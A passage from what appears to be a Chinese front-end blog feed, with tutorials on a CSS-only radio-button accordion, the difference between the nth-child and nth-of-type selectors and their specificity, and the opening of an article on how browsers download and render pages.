class="attr">id</span>=<span class="string">&quot;radio-3&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">    这是一串内容</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/01/72efwHKpYDSG56r.gif" alt=""></p><h1 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h1><p>为其添加样式与动画后：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">label</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">135</span>, <span class="number">206</span>, <span class="number">235</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">label</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">8</span>, <span class="number">181</span>, <span class="number">250</span>);</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">input</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">visibility</span>: hidden;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: pink;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">transition</span>: all <span class="number">0.2s</span> ease;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">input</span><span class="selector-pseudo">:checked</span>+<span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;form&gt; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;selector&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;radio-1&quot;</span>&gt;</span>选择<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;radio-1&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">        这是一串内容</span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;selector&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;radio-2&quot;</span>&gt;</span>选择<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;radio-2&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">        这是一串内容</span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;selector&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;radio-3&quot;</span>&gt;</span>选择<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;radio-3&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">        这是一串内容</span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/01/JCL13wN6lfQKe28.gif" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSS3选择器的 nth-child 与 nth-of-type</title>
      <link href="/2019/12/fec80bb66774.html"/>
      <url>/2019/12/fec80bb66774.html</url>
      
        <content type="html"><![CDATA[<h1 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h1><p>CSS3 的选择器文档说明简直让人看的头大，每一句话都搞得跟阅读理解一样，就算读通了也没有办法理解，所以就在这里好好研究一下 CSS3 的选择器到底选择目标是什么。</p><h1 id="nth-child"><a href="#nth-child" class="headerlink" title="nth-child"></a>nth-child</h1><blockquote><p>官方解释：<code>p:nth-child(2)</code> 规定属于其父元素的第二个子元素的每个 p 的背景色</p></blockquote><p>最难让我头大的就是这个 <code>nth-child</code> 本身不难理解，就是选择对应父级的第 n 个节点元素，比如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 基础样式，分离每个 .wrapper 下的子元素 */</span></span><br><span class="line"><span class="selector-class">.wrapper</span>&gt;* &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">2px</span> solid pink;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">5px</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span> <span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>i&#x27;m p<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inner&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>i&#x27;m p too<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>i&#x27;m div<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/01/EnRM6Q5wbmPZUxN.png" alt=""></p><p>但是恶心就恶心在，在这里使用的伪类是后缀与一个空选择器上，所以就直接表示为父元素的第二个子元素，那么如果我们为其前面加上一个 <code>li</code>，那就变成了：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> <span class="selector-tag">li</span><span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/01/7IGbWzC2lrFAt8y.png" alt=""></p><p>经过一翻思想斗争，终于悟出了这里的语法解释意思为：选择 <code>.wrapper</code> 下的每个 <code>li</code> 元素，然后看这个 <code>li</code> 元素是否是其父级元素的第二个子元素，如果是就应用样式，如果不是就不应用样式。</p><p>我们要理解普通选择器是向下查找，每次添加条件，而伪类是用来过滤选择到的元素。</p><p>============= 以下为 2024 年新增： ============</p><p>再看前面的示例，最开始的理解其实是错的，不是说伪类选择器前面没有挨着其他选择器就表示匹配当前元素的第 n 个元素了，而是如果伪类选择器没有指定任何其他选择器的话，就说明匹配前面选择器下匹配到的所有元素，换句话说</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> <span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就等同于：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> *<span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>表示为匹配 <code>.wrapper</code> 元素下所有属于父元素的第二个子元素的元素，背景颜色都变为 <code>skyblue</code>，那匹配到的 DOM 节点就应该为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">```html</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>i&#x27;m p<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inner&quot;</span>&gt;</span> <span class="comment">&lt;!-- 匹配到，背景颜色设置为 blue --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">li</span>&gt;</span> <span class="comment">&lt;!-- 匹配到，背景颜色设置为 blue --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span> <span class="comment">&lt;!-- 匹配到，背景颜色设置为 blue --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">li</span>&gt;</span> <span class="comment">&lt;!-- 匹配到，背景颜色设置为 blue --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>i&#x27;m p too<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>i&#x27;m div<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>只是前面贴的图片看不出来而已。</p><h1 id="last-child"><a href="#last-child" class="headerlink" title="last-child"></a>last-child</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> <span class="selector-tag">li</span><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/01/OUkoEIPAaRQ4tKY.png" alt=""></p><h1 id="first-child"><a href="#first-child" class="headerlink" title="first-child"></a>first-child</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> <span class="selector-tag">li</span><span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/01/76jk8dcLsuUGbtE.png" alt=""></p><h1 id="nth-of-type"><a href="#nth-of-type" class="headerlink" title="nth-of-type"></a>nth-of-type</h1><blockquote><p>官方解释：<code>p:nth-of-type(2)</code> 选择每个p元素是其父级的第二个p元素    </p></blockquote><p>我们按照刚才的思路去理解这个选择器，其流程为：选择 <code>.wrapper</code> 下的所有 <code>li</code> 元素，如果其在当前的同类型的兄弟节点中排第二个，那么就应用样式，否则不应用：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> <span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/01/UfrIEFSnvN2Vt4y.png" alt=""></p><p>但是如果前面不加 <code>li</code>，而应用于 <code>.wrapper</code> 下的每个元素，那么就会变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.wrapper :nth-of-type(2) &#123;</span><br><span class="line">  background-color: skyblue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/01/N2QHjxTtnbIXf9i.png" alt=""></p><p>这个是因为没有规定子级的过滤元素，那么在匹配到每个新的标签类型时，都会验证其在兄弟节点相同的标签类型下，其是否是第2个，如果是就应用样式，如果不是就不应用样式</p><h1 id="权重问题"><a href="#权重问题" class="headerlink" title="权重问题"></a>权重问题</h1><p>CSS 的伪类选择器权重与 class 选择器权重是同等级的，举个例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span>div<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span>div<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span>li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span>li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> <span class="selector-class">.child</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span> <span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/01/lSwPCH1p6BkLaxQ.png" alt=""></p><p>同等级下，伪类选择器的效果覆盖了 class 选择器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> <span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.wrapper</span> <span class="selector-class">.child</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/01/9TGyMjkSzHsgulq.png" alt=""></p><p>调换位置后，class选择器覆盖了伪类选择器的效果</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浏览器渲染页面的过程</title>
      <link href="/2019/11/873f80406942.html"/>
      <url>/2019/11/873f80406942.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-主要过程"><a href="#1-主要过程" class="headerlink" title="1. 主要过程"></a>1. 主要过程</h1><p>下图是浏览器解析一个页面的主要过程，大体上为：下载HTML - 并行下载 head 中的 CSS JS - 生成 DOM 数、CSSOM 树 - 生成渲染树 - DOMContentLoaded 事件被触发 - 加载其他资源 - window.onload 事件被触发</p><p>更简化一点：下载资源 - 渲染解析 - 展示页面</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191129173553.png" alt="加载页面的过程"></p><p>但是在展示页面时，所有的操作并非是一个线性的过程，其中还有很多并行操作与阻塞操作，整理一下具体的过程可以为：</p><p>首先，开源浏览器一般以8k每块下载html页面。然后解析页面生成DOM树，遇到css标签或JS脚本标签就新起线程去下载他们，并继续构建DOM。下载完后解析CSS为CSS规则树，浏览器结合CSS规则树和DOM树生成Render Tree。</p><p><strong>注意</strong>：构建 CSS Object Model（CSSOM）会阻塞 JavaScript 的执行。JavaScript 的执行也会阻塞 DOM 的构建。 </p><p>JavaScript下载后可以通过DOM API修改DOM，通过 CSSOM API 修改样式作用域 Render Tree。</p><p>每次修改会造成Render Tree的重新布局和重绘。只要修改DOM或修改了元素的形状或大小，就会触发Reflow，单纯修改元素的颜色只需Repaint一下（调用操作系统Native GUI的API绘制）。</p><h1 id="2-资源的下载过程"><a href="#2-资源的下载过程" class="headerlink" title="2. 资源的下载过程"></a>2. 资源的下载过程</h1><p>对于一个完整的网站，首先会下载页面的 HTML，当 HTML 下载完成后，就开始进行 HTML 解析，在解析的过程中，遇到需要下载的外部 css 或者 js 会对其进行异步下载，但是当页面遇到了 JS 时，解析会被阻塞，需要先执行 JS 脚本，再解析后面的内容。</p><p>但是在现代浏览器中，为了防止 JS 解析消耗过长的时间，浏览器在 HTML 下载完成后会预览整个 HTML 的 dom 结构，不论当前 DOM 解析引擎是否进行到加载资源的位置，都会统一预下载页面中所有的资源，所以资源的下载不会是一个阻塞的过程，资源会按照先后顺序进行下载。</p><p>如下图，我们在 HTML <code>head</code> 标签引入的 JS 脚本执行需要 10s ，浏览器并不会等待 10s ，而是直接先去下载后面的资源：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191129213447.png" alt=""></p><p>这里要提一点的是，由于 JS 和 CSS 是页面渲染的重要资源，而图片、媒体资源并非是重要资源，所以图片、媒体资源并不影响页面的渲染，他们只会影响页面 <code>onload</code> 的触发时间。</p><h1 id="3-解析渲染的过程"><a href="#3-解析渲染的过程" class="headerlink" title="3. 解析渲染的过程"></a>3. 